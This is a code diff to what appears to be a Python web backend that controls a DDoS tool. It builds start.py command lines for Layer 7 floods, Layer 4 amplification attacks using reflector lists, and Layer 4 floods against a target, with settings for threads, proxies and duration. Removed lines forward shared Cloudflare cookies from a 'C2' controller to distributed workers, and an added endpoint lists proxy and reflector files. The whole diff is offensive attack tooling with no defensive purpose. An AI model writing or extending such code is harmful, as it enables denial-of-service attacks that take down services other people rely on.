@@ -282,6 +282,7 @@ class AttackParams(BaseModel):
     autoscale: bool = False
     evasion: bool = False
     distribute_to_workers: bool = False
+    debug_mode: bool = False
 
 class ProxyProvider(BaseModel):
     type: int
@@ -322,66 +323,71 @@ class HealthResponse(BaseModel):
 # --- Helper Functions ---
 def build_attack_command(params: AttackParams) -> list[str]:
     """Safely constructs the command line arguments for start.py."""
-    proxy_list_arg = params.proxy_list
+    proxy_list_arg = params.proxy_list if params.proxy_list else "default.txt"
     proxy_type_code = PROXY_TYPES.get(params.proxy_type, "5")
     
     if params.auto_harvest:
         proxy_list_arg = "auto_harvest.txt"
-        BASE_DIR / "files" / "proxies" / "auto_harvest.txt"
-        # If auto_harvest is explicitly requested, we don't delete it here
-        # start.py handles the missing file by re-harvesting
-    elif params.proxy_type == "All Proxy" and not proxy_list_arg:
+    elif params.proxy_type == "All Proxy" and not params.proxy_list:
         proxy_list_arg = "all.txt"
         
-    command = [sys.executable, "-u", "start.py", params.method, params.target]
+    start_py_path = BASE_DIR / "resource" / "start.py"
+    # Basic: python -u start.py <method> <target>
+    command = [sys.executable, "-u", str(start_py_path), params.method, params.target]
     
     if params.method in LAYER7:
+        # L7 expects: type, threads, list, rpc, duration, debug(optional)
         command.extend([
             proxy_type_code, 
             str(params.threads), 
-            proxy_list_arg if proxy_list_arg else "default.txt", 
+            proxy_list_arg, 
             str(params.rpc), 
-            str(params.duration), 
-            str(params.proxy_refresh)
+            str(params.duration)
         ])
     elif params.method in LAYER4_AMP:
+        # L4 Amp expects: threads, duration, reflector, debug(optional)
         command.extend([
             str(params.threads), 
             str(params.duration), 
             params.reflector if params.reflector else "reflector.txt"
         ])
     elif params.method in LAYER4_NORMAL:
-        if proxy_list_arg and proxy_list_arg.strip() != "":
-            command.extend([
-                str(params.threads), 
-                str(params.duration), 
-                proxy_type_code, 
-                proxy_list_arg, 
-                str(params.proxy_refresh)
-            ])
-        else:
-            command.extend([
-                str(params.threads), 
-                str(params.duration)
-            ])
+        # L4 Normal expects: threads, duration, type(optional), list(optional), debug(optional)
+        command.extend([
+            str(params.threads), 
+            str(params.duration)
+        ])
+        # If proxies are provided for L4 Normal
+        if params.proxy_list:
+            command.extend([proxy_type_code, proxy_list_arg])
             
-    if params.smart_rpc:
-        command.append("--smart")
-    if params.autoscale:
-        command.append("--autoscale")
-    if params.evasion:
-        command.append("--evasion")
+    if params.debug_mode:
+        command.append("true")
         
-    # Inject Shared Cookies for Distributed Turbo Mode
-    if C2.shared_cf_cookie:
-        # Pass the cookie as an environment variable or flag. 
-        # Here we add it as an argument that we will parse in start.py
-        command.extend(["--shared-cookie", C2.shared_cf_cookie])
-    if C2.shared_cf_ua:
-        command.extend(["--shared-ua", C2.shared_cf_ua])
-        
-    # session-id is appended by start_attack() after build
     return command
+
+# --- Extra API Endpoints ---
+@app.get("/api/files/list")
+async def list_internal_files():
+    """Lists available proxy and reflector files for UI dropdowns."""
+    # Note: These live inside resource/files
+    proxy_dir = BASE_DIR / "resource" / "files" / "proxies"
+    refl_dir = BASE_DIR / "resource" / "files"
+    
+    proxies = ["default.txt"]
+    if proxy_dir.exists():
+        proxies.extend([f.name for f in proxy_dir.glob("*.txt") if f.name != "default.txt"])
+    
+    reflectors = ["reflector.txt"]
+    if refl_dir.exists():
+        reflectors.extend([f.name for f in refl_dir.glob("*.txt") if f.name not in ["useragent.txt", "referers.txt", "reflector.txt"]])
+    
+    return {
+        "status": "success",
+        "proxies": list(set(proxies)),
+        "reflectors": list(set(reflectors))
+    }
+
 
 async def broadcast_log(message: str) -> None:
     """Queues a log message for the efficient broadcaster daemon."""
